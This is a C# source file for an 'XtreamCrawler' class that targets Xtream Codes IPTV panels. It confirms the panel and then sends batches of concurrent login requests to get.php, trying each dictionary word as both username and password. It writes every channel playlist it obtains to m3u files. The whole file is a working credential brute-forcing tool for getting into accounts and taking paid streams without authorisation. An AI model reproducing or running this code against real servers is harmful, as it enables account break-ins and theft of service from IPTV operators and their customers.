using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using System.ComponentModel;
using System.IO;

namespace IPTV_Sharp
{

    public enum CrawlerStatus
    {
        Idle,
        Working,
        InvalidSite,
        CompletedWithResults,
        CompletedWithoutResults,
        Aborted
    }

    public class XtreamCrawler
    {
        private DictionaryManager dictionary;
        private HttpClient client;
        private string server;
        private int concurrent_tasks;

        public int progress;
        public CrawlerStatus status;
        public int num_results=0;
                      
        public XtreamCrawler(DictionaryManager dictionary, string server, int concurrent_tasks)
        {
            this.dictionary = dictionary;
            this.server = server;
            client = new HttpClient();
            status = CrawlerStatus.Idle;
            this.concurrent_tasks = concurrent_tasks; 
        }


        public void DoCrawl(object sender, DoWorkEventArgs e)
        {
            status = CrawlerStatus.Working;
            Crawl_Method();
        }


        private async Task Crawl_Method()
        {
            string output_result = string.Empty;
            bool found_result = false;
            progress = 0;
            num_results = 0;
            try
            {
                string page = await client.GetStringAsync(server);

                if (page != "" && page.Contains("Xtream Codes") && dictionary.entries.Count > 0)
                {                  

                    while (progress < dictionary.entries.Count)
                    {
                        int increment;
                        if ((progress + concurrent_tasks) < dictionary.entries.Count)
                        {
                            increment = concurrent_tasks;
                        }
                        else
                        {
                            increment = dictionary.entries.Count - progress;
                        }

                        Task<string>[] crawl_tasks = new Task<string>[increment];

                        for (int j = 0; j < crawl_tasks.Length; j++)
                        {
                            int x = progress + j;
                            crawl_tasks[j] = client.GetStringAsync(server + "/get.php?username=" + dictionary.entries[x] + "&password=" + dictionary.entries[x] + "&type=m3u&output=mpegts");
                        }

                        Task.WaitAll(crawl_tasks);

                        foreach (Task<string> crawl_task in crawl_tasks)
                        {
                            if (crawl_task.IsCompleted && crawl_task.Result != "")
                            {
                                output_result = crawl_task.Result;
                                found_result = true;
                                num_results++;
                                if (!Directory.Exists("output")) Directory.CreateDirectory("output");
                                string output = "output/tv_channels_" + num_results + ".m3u";
                                StreamWriter outputFile = new StreamWriter(output, true);
                                outputFile.WriteLine(output_result);
                                outputFile.Flush();
                                outputFile.Close();
                                outputFile.Dispose();

                            }
                        }

                        progress += increment;
                    }
                    
                    if(found_result)
                    {
                        status = CrawlerStatus.CompletedWithResults;    
                    }
                    else
                    {
                        status = CrawlerStatus.CompletedWithoutResults;
                    }
                }
                else
                {
                    status = CrawlerStatus.InvalidSite;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                status = CrawlerStatus.Aborted;
            }
        }




    }
}
